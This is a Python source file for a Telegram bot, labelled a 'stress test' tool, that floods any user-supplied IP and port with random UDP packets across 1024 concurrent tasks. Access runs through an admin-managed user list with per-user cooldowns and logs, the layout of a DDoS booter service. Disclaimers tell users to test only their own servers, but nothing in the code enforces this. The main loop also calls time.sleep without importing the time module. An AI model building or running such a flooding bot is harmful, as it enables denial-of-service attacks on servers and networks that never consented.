import os
import asyncio
import telebot
import random
import socket
import datetime
import re
from dotenv import load_dotenv
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# WARNING: This tool is for authorized stress testing only. Testing unauthorized targets is ILLEGAL.
# Use only on servers you own or have explicit permission (e.g., 127.0.0.1 with netcat).

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN not set in .env")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Configuration
ADMIN_IDS = {"1536223598"}  # Authorized admin ID
USER_FILE = "authorized_users.txt"
LOG_FILE = "stress_test_logs.txt"
COOLDOWN_SECONDS = 300  # 5-minute cooldown for non-admins

# Load authorized users
def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return set(f.read().splitlines())
    except FileNotFoundError:
        return set()

allowed_users = load_users()

# Validate IP address (basic check)
def is_valid_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

# Log test details
def log_test(user_id, ip, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.datetime.now()}] {username} tested {ip}:{port} for {duration}s\n")
    except Exception as e:
        print(f"Logging failed: {e}")

# Create inline keyboard
def get_menu_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("How to Use", callback_data="how_to_use"),
        InlineKeyboardButton("Start", callback_data="start")
    )
    return keyboard

# Cooldown tracking
cooldowns = {}

async def send_keep_alive_packet(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytearray(random.getrandbits(8) for _ in range(2048))  # 2048-byte random payload
    end_time = datetime.datetime.now().timestamp() + duration

    while datetime.datetime.now().timestamp() < end_time:
        try:
            sock.sendto(payload, (ip, port))
            await asyncio.sleep(1)  # Keep-alive interval of 1 second
        except Exception as e:
            print(f"Packet send failed: {e}")
            break

    sock.close()

async def run_stress_test(ip, port, duration, threads):
    tasks = [send_keep_alive_packet(ip, port, duration) for _ in range(threads)]
    await asyncio.gather(*tasks)

@bot.message_handler(commands=['start', 'menu'])
def start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to StressTestBot, {user_name}!\nChoose an option below:"
    bot.reply_to(message, response, reply_markup=get_menu_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "how_to_use":
        response = """How to Use StressTestBot:
Commands:
- /test <ip> <port> <time> : Run a stress test with keep-alive packets.
- /id : Show your Telegram ID.
- /rules : View usage rules.
Admin Commands:
- /add <user_id> : Add a user.
- /remove <user_id> : Remove a user.
- /logs : View test logs.
- /clearlogs : Clear logs.

Rules:
1. Only test servers you own or have permission for.
2. Non-admins: One test every 5 minutes.
3. Misuse may lead to legal consequences."""
        bot.send_message(call.message.chat.id, response, reply_markup=get_menu_keyboard())
    elif call.data == "start":
        user_name = call.from_user.first_name
        response = f"Welcome back, {user_name}!\nChoose an option below:"
        bot.send_message(call.message.chat.id, response, reply_markup=get_menu_keyboard())
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['id'])
def show_id(message):
    bot.reply_to(message, f"Your ID: {message.chat.id}")

@bot.message_handler(commands=['rules'])
def rules(message):
    response = """StressTestBot Rules:
1. Only test servers you own or have explicit permission for (e.g., 127.0.0.1).
2. Non-admins: One test every 5 minutes.
3. Unauthorized testing is ILLEGAL and logged."""
    bot.reply_to(message, response)

@bot.message_handler(commands=['test'])
def test(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_users:
        bot.reply_to(message, "Unauthorized. Contact admin.")
        return

    # Check cooldown for non-admins
    if user_id not in ADMIN_IDS and user_id in cooldowns and (datetime.datetime.now() - cooldowns[user_id]).seconds < COOLDOWN_SECONDS:
        bot.reply_to(message, f"Please wait {COOLDOWN_SECONDS}s before testing again.")
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /test <ip> <port> <time>")
        return

    ip, port, time = args[1], args[2], args[3]

    # Minimal validation to prevent crashes
    if not is_valid_ip(ip):
        bot.reply_to(message, "Invalid IP format.")
        return
    try:
        port = int(port)
        time = int(time)
        if time < 1:
            bot.reply_to(message, "Time must be positive.")
            return
        threads = 1024  # Default threads as in soulcrack.py
    except ValueError:
        bot.reply_to(message, "Port and time must be integers.")
        return

    # Update cooldown
    if user_id not in ADMIN_IDS:
        cooldowns[user_id] = datetime.datetime.now()

    # Run stress test
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_stress_test(ip, port, time, threads))
        log_test(user_id, ip, port, time)
        bot.reply_to(message, f"Stress test completed on {ip}:{port} for {time}s with keep-alive packets.")
    except Exception as e:
        bot.reply_to(message, f"Test failed: {e}")
    finally:
        loop.close()

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admins only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /add <user_id>")
        return
    user_id = args[1]
    if not user_id.isdigit():
        bot.reply_to(message, "User ID must be a number.")
        return
    if user_id in allowed_users:
        bot.reply_to(message, "User already authorized.")
    else:
        allowed_users.add(user_id)
        with open(USER_FILE, "a") as f:
            f.write(f"{user_id}\n")
        bot.reply_to(message, f"User {user_id} added.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admins only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return
    user_id = args[1]
    if user_id in allowed_users:
        allowed_users.remove(user_id)
        with open(USER_FILE, "w") as f:
            f.write("\n".join(allowed_users) + "\n")
        bot.reply_to(message, f"User {user_id} removed.")
    else:
        bot.reply_to(message, "User not found.")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admins only.")
        return
    try:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    except FileNotFoundError:
        bot.reply_to(message, "No logs found.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admins only.")
        return
    try:
        with open(LOG_FILE, "w") as f:
            f.write("")
        bot.reply_to(message, "Logs cleared successfully.")
    except Exception as e:
        bot.reply_to(message, f"Failed to clear logs: {e}")

# Run bot
if __name__ == "__main__":
    print("Starting StressTestBot...")
    print("WARNING: Use this tool responsibly. Unauthorized testing is illegal.")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)
